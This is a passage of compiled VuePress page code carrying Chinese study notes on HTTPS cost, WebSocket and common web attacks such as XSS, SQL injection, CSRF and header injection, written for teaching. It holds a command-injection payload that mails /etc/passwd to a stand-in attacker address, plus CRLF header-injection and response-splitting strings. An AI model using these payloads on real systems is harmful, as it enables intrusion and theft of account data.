"),t("li",[a._v("另一点是 SSL 必须进行加密处理。在服务器和客户端都需要进行加密和解密的运算处理。因此从结果上讲，比起 HTTP 会更多地消耗服务器和客户端的硬件资源，导致负载增强。")]),a._v(" "),t("li",[a._v("针对速度变慢这一问题，并没有根本性的解决方案，我们会使用 SSL 加速器这种（专用服务器）硬件来改善该问题。该硬件为 SSL 通信专用硬件，相对软件来讲，能够提高数倍 SSL 的计算速度。仅在 SSL 处理时发挥 SSL 加速器的功效，以分担负载。")])])])])]),a._v(" "),t("h2",{attrs:{id:"_32-websocket-协议特点"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_32-websocket-协议特点"}},[a._v("#")]),a._v(" 32. WebSocket 协议特点")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("推送功能：支持由服务器向客户端推送数据的推送功能。这样，服务器可直接发送数据，而不必等待客户端的请求。")])]),a._v(" "),t("li",[t("p",[a._v("减少通信量：只要建立起 WebSocket 连接，就希望一直保持连接状态。和 HTTP 相比，不但每次连接时的总开销减少，而且由于 WebSocket 的首部信息很小，通信量也相应减少了。")])])]),a._v(" "),t("h2",{attrs:{id:"_33-web-的攻击技术"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_33-web-的攻击技术"}},[a._v("#")]),a._v(" 33. Web 的攻击技术")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("针对 Web 应用的攻击模式。")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("以服务器为目标的主动攻击。")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("主动攻击（active attack）是指攻击者通过直接访问 Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。")]),a._v(" "),t("li",[a._v("主动攻击模式里具有代表性的攻击是 SQL 注入攻击和 OS 命令注入攻击。")])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/以服务器为目标的主动攻击.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("以服务器为目标的被动攻击。")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访问发起攻击。被动攻击通常的攻击模式如下所示。")]),a._v(" "),t("blockquote",[t("ol",[t("li",[a._v("攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求。")]),a._v(" "),t("li",[a._v("当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。")]),a._v(" "),t("li",[a._v("中招后的用户浏览器会把含有攻击代码的 HTTP 请求发送给作为攻击目标的 Web 应用，运行攻击代码。")]),a._v(" "),t("li",[a._v("执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。")])]),a._v(" "),t("ul",[t("li",[a._v("被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站点请求伪造。")])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/以服务器为目标的被动攻击.png"),loading:"lazy"}})])])])])]),a._v(" "),t("li",[t("p",[a._v("因输出值转义不完全引发的安全漏洞。")]),a._v(" "),t("blockquote",[t("p",[a._v("实施 Web 应用的安全对策可大致分为两部分：客户端的验证和 Web 应用端（服务器端）的验证 —— 输入值验证或输出值转义。")])])]),a._v(" "),t("li",[t("p",[a._v("跨站脚本攻击。")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。动态创建的 HTML 部分有可能隐藏着安全漏洞。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击，跨站脚本攻击有可能造成以下影响。")]),a._v(" "),t("blockquote",[t("ol",[t("li",[a._v("利用虚假输入表单骗取用户个人信息。")]),a._v(" "),t("li",[a._v("利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。")]),a._v(" "),t("li",[a._v("显示伪造的文章或图片。")])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/跨站脚本攻击.png"),loading:"lazy"}})])])]),a._v(" "),t("li",[t("p",[a._v("SQL 注入攻击。")]),a._v(" "),t("blockquote",[t("p",[a._v("SQL 注入（SQL Injection）是指针对 Web 应用使用的数据库，通过运行非法的 SQL 而产生的攻击。该安全隐患有可能引发极大的威胁，有时会直接导致个人信息及机密信息的泄露。")])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/SQL 注入攻击.png"),loading:"lazy"}})]),a._v(" "),t("li",[t("p",[a._v("OS 命令注入攻击。")]),a._v(" "),t("blockquote",[t("p",[a._v("OS 命令注入攻击（OS Command Injection）是指通过 Web 应用，执行非法的操作系统命令达到攻击的目的。只要在能调用 Shell 函数的地方就有存在被攻击的风险。")])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/OS 命令注入攻击.png"),loading:"lazy"}}),a._v(" "),t("blockquote",[t("p",[a._v("下面摘选处理该表单内容的一部分核心代码。")])]),a._v(" "),t("div",{staticClass:"language-js line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-js"}},[t("code",[a._v("my $adr "),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" $q"),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("-")]),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),t("span",{pre:!0,attrs:{class:"token function"}},[a._v("param")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[a._v("'mailaddress'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token function"}},[a._v("open")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),t("span",{pre:!0,attrs:{class:"token constant"}},[a._v("MAIL")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[a._v('"| /usr/sbin/sendmail $adr"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),a._v("\nprint "),t("span",{pre:!0,attrs:{class:"token constant"}},[a._v("MAIL")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[a._v('"From: info@example.com\\n"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br")])]),t("blockquote",[t("ol",[t("li",[a._v("程序中的 open 函数会调用 sendmail 命令发送邮件，而指定的邮件发送地址即 $adr 的值。")]),a._v(" "),t("li",[a._v("攻击者将下面的值指定作为邮件地址。")])])]),a._v(" "),t("div",{staticClass:"language-sh line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[a._v("cat")]),a._v(" /etc/passwd "),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("|")]),a._v(" mail hack@example.jp\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("blockquote",[t("ol",{attrs:{start:"3"}},[t("li",[a._v("程序接收该值，构成以下的命令组合。")])])]),a._v(" "),t("div",{staticClass:"language-sh line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("|")]),a._v(" /usr/sbin/sendmail "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[a._v("cat")]),a._v(" /etc/passwd "),t("span",{pre:!0,attrs:{class:"token operator"}},[a._v("|")]),a._v(" mail hack@example.jp\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("blockquote",[t("ol",{attrs:{start:"4"}},[t("li",[a._v("攻击者的输入值中含有分号（;）。这个符号在 OS 命令中，会被解析为分隔多个执行命令的标记。")]),a._v(" "),t("li",[a._v("可见，sendmail 命令执行被分隔后，接下去就会执行 cat/etc/passwd | mail hack@example.jp 这样的命令了。结果，含有 Linux 账户信息 /etc/passwd 的文件，就以邮件形式发送给了 hack@example.jp。")])])])]),a._v(" "),t("li",[t("p",[a._v("HTTP 首部注入攻击。")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("HTTP 首部注入攻击（HTTP Header Injection）是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。")]),a._v(" "),t("blockquote",[t("p",[a._v("如下所示，Web 应用有时会把从外部接收到的数值，赋给响应首部字段 Location 和 Set-Cookie。")])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Location")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("http://www.example.com/a.cgi?q=12345")])]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Set-Cookie")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("UID=12345")])]),a._v("\n＊12345就是插入值\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br")])]),t("blockquote",[t("ul",[t("li",[a._v("HTTP 首部注入可能像这样，通过在某些响应首部字段需要处理输出值的地方，插入换行发动攻击。")])])]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("HTTP 首部注入攻击有可能会造成以下一些影响。")]),a._v(" "),t("li",[a._v("1、设置任何 Cookie 信息。")]),a._v(" "),t("li",[a._v("2、重定向至任意 URL。")]),a._v(" "),t("li",[a._v("3、显示任意的主体（HTTP 响应截断攻击）。")])])]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("攻击者以下面的内容替代之前的类别 ID 后发送请求。")])])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[a._v("101%0D%0ASet-Cookie:+SID=123456789\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("blockquote",[t("ul",[t("li",[a._v("其中，%0D%0A 代表 HTTP 报文中的换行符，紧接着的是可强制将攻击者网站（http://hackr.jp/）的会话 ID 设置成 SID=123456789 的 Set-Cookie 首部字段。")]),a._v(" "),t("li",[a._v("此刻，首部字段 Set-Cookie 已生效，因此攻击者可指定修改任意的 Cookie 信息。通过和会话固定攻击（攻击者可使用指定的会话 ID）攻击组合，攻击者可伪装成用户。")]),a._v(" "),t("li",[a._v("攻击者输入的 %0D%0A，原本应该属于首部字段 Location 的查询值部分，但经过解析后，%0D%0A 变成了换行符，结果插入了新的首部字段。")]),a._v(" "),t("li",[a._v("这样一来，攻击者可在响应中插入任意的首部字段。")])])])]),a._v(" "),t("li",[t("p",[a._v("HTTP 响应截断攻击。")]),a._v(" "),t("blockquote",[t("p",[a._v("HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。这样的攻击叫做 HTTP 响应截断攻击。")])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[a._v("%0D%0A%0D%0A<HTML><HEAD><TITLE>之后，想要显示的网页内容 <!\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("blockquote",[t("p",[a._v("在可能进行 HTTP 首部注入的环节，通过发送上面的字符串，返回结果得到以下这种响应。")])]),a._v(" "),t("div",{staticClass:"language-HTTP line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[a._v("Set-Cookie")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token header-value"}},[a._v("UID=（%0D%0A ：换行符）")])]),a._v("\n（%0D%0A ：换行符）\n<HTML><HEAD><TITLE>之后，想要显示的网页内容 \x3c!--（原来页面对应的首部字段和主体部分全视为注释）\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br")])]),t("blockquote",[t("p",[a._v("利用这个攻击，已触发陷阱的用户浏览器会显示伪造的 Web 页面，再让用户输入自己的个人信息等，可达到和跨站脚本攻击相同的效果。")])])])])]),a._v(" "),t("li",[t("p",[a._v("跨站点请求伪造。")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击，跨站点请求伪造有可能会造成以下等影响。")]),a._v(" "),t("blockquote",[t("ol",[t("li",[a._v("利用已通过认证的用户权限更新设定信息等。")]),a._v(" "),t("li",[a._v("利用已通过认证的用户权限购买商品。")]),a._v(" "),t("li",[a._v("利用已通过认证的用户权限在留言板上发表言论。")])])]),a._v(" "),t("img",{staticClass:"lazy",attrs:{src:a.$withBase("/images/HTTP/跨站点请求伪造.png"),loading:"lazy"}})])])])]),a._v(" "),t("h2",{attrs:{id:"_34-其他安全漏洞"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_34-其他安全漏洞"}},[a._v("#")]),a._v(" 34. 其他安全漏洞")]),a._v(" "),t("ul",[t("li",[t("p",[a._v("点击劫持：点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UIRedressing）。")])]),a._v(" "),t("li",[t("p",[a._v("DoS 攻击：DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。主要有以下两种 DoS 攻击方式：")]),a._v(" "),t("blockquote",[t("ul",[t("li",[a._v("集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态。")]),a._v(" "),t("li",[a._v("通过攻击安全漏洞使服务停止。")])])])])])])}),[],!1,null,null,null);t.default=l.exports}}]);